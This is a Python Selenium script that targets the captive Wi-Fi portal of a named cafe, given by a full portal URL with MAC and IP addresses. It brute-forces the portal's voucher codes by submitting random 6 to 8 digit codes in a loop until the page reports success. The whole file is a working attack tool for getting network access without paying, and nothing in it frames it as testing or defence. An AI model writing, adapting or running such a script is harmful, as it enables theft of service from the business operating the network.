from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.keys import Keys
from webdriver_manager.firefox import GeckoDriverManager

import random
import time
import os

def get_digit_count():
    while True:
        try:
            digits = int(input("Enter number of digits for the code (6-8): "))
            if 6 <= digits <= 8:
                return digits
            else:
                print("Please enter a number between 6 and 8.")
        except ValueError:
            print("Invalid input. Please enter a number.")

def pause_indefinitely():
    print("Paused. Press Ctrl+C to exit.")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass


URL = "http://192.168.1.44:8088/portal/entry?cid=0C:9A:3C:B5:15:53&ap=A8:42:A1:5F:46:5A&ssid=The%20Millas%20Cafe&clientIp=192.168.1.97&t=1757228658&rid=1&u=www.msftconnecttest.com%2Fredirect"
gecko_path = os.path.join(os.getcwd(), "geckodriver.exe")
service = Service(executable_path=gecko_path)
driver = webdriver.Firefox(service=service)

driver.get(URL)

digits = get_digit_count()
seen = set()
attempt = 1

try:
    while True:
        code = f"{random.randint(0, 10**digits - 1):0{digits}d}"
        if code in seen:
            continue
        seen.add(code)


        input_field = driver.find_element(By.ID, "voucherCode")
        input_field.clear()
        input_field.send_keys(code)
        input_field.send_keys(Keys.RETURN)

        # Check the terms checkbox if present
        try:
            checkbox = driver.find_element(By.CLASS_NAME, "term-checkbox-wrap")
            if not checkbox.is_selected():
                checkbox.click()
        except Exception:
            pass  # Checkbox not found or already checked

        button = driver.find_element(By.ID, "button-login")
        driver.execute_script("arguments[0].click();", button)

        print(f"Attempt #{attempt}: Tried code: {code}")
        attempt += 1

        # Check for success (customize this selector/message as needed)
        if "success" in driver.page_source.lower():
            print(f"SUCCESS! Code that worked: {code}")
            pause_indefinitely()
            break
except Exception as e:
    print(f"Error: {e}")
finally:
    driver.quit()
